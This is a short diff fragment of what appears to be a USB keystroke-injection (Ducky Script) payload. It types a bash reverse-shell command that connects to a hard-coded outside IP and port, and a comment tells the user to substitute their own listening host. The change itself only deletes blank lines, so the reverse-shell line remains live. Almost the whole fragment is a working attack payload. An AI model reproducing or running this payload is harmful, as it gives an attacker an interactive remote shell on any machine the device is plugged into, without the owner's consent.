@@ -20,11 +20,8 @@ STRING bash
 DELAY 50
 ENTER
 DELAY 50
-
 STRING bash -i >& /dev/tcp/173.255.247.5/87 0>&1
-
 REM Replace IP and port above with listening host
-
 DELAY 50
 ENTER
 DELAY 50
